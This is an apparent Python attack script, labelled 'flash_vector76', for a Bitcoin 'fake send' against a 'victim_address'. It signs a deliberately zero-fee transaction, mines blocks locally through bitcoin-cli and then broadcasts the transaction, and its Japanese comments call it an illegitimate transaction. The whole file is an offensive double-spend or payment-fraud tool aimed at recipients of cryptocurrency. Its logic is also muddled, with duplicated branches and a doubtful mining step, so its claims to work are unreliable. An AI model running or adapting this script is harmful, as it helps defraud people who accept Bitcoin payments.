import time
import cryptos
import requests
import argparse
import subprocess

from bs4 import BeautifulSoup

def generate_block(address, block, submit=False):
    subprocess.run(['bitcoin-cli', "generateblock", address, f"['{block}']", str(submit).lower()],
                             capture_output=True, 
                             text=True,
                             check=True)

def send_rawtransaction(hextx):
    result = subprocess.run(['bitcoin-cli', "sendrawtransaction", hextx],
                             capture_output=True, 
                             text=True,
                             check=True)
    return result.stdout

parser = argparse.ArgumentParser(description="How To Use flash_vector76")
parser.add_argument("send_from_wifkey",
                    help="Fake send btc from wif key.",
                    type=str)
parser.add_argument("fake_send_to",
                    help="Fake send btc to address.",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
                    type=float)
parser.add_argument("--is_testnet",
                    "-test",
                    help="Testnet flag (Default=True)",
                    default=True,
                    type=bool)

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)


args = parser.parse_args()
fake_send_from   = args.send_from_wifkey
victim_address   = args.fake_send_to
amount_btc = args.amount_of_coins
testnet    = args.is_testnet

transaction_util = cryptos.Bitcoin(testnet=testnet)
print("OK")
balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
if balance["confirmed"] <= 0:
    balance = balance["unconfirmed"]
else:
    balance = balance["confirmed"]

send_amount = to_satoshi(amount_btc)

if balance < send_amount:
    print(f"[!] insufficient funds. ")
    exit()

fee = 0 # ここはマインングできないくらい著しく小さな値にすることが重要。

change_btc_amt = (balance - send_amount) #おつり

if testnet:
    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
else:
    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]

tx_victim = transaction_util.mktx(inputs, tx_victim)
if testnet:
    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
else:
    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))

print("Generating block using vector76 method...")
send_rawtransaction(tx_victim)
for i in range(6):
    print(f" {i + 1} / 6   ...")
    generate_block(transaction_util.wiftoaddr(fake_send_from), tx_victim)
print()
print(inputs)
print()
print("[+] READY...")
print()
print("--------------------")
print(f"Fake Send to                       : {victim_address}")
print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
print(f"Signed  RawTx             : {tx_victim}")
print(f"Testnet Mode              : {testnet}")
print("--------------------")
print()
print()

print()
input(" --- If you really want to continue, press enter. --- ")
print()
print()
print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
print()
time.sleep(3) #..... -u-
print("PUB ITX TOBC! (不正なトランザクションをブロックチェーンに公開!)")
transaction_util.pushtx(tx_victim)
time.sleep(2)
print()
#おまけ
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()

sound_name = "ImagineBreaker.mp3"
try:
    import soundplay
    soundplay.playsound(sound_name)
except:
    try:
        imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
        subprocess.run(imagine_breaker_cmd)
    except:
        pass
time.sleep(1)
balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))

print("----------------")
balance = transaction_util.get_balance(victim_address)
print(f"fake send to address Balance (satoshi unit) :{balance}")
print()
print("Done.")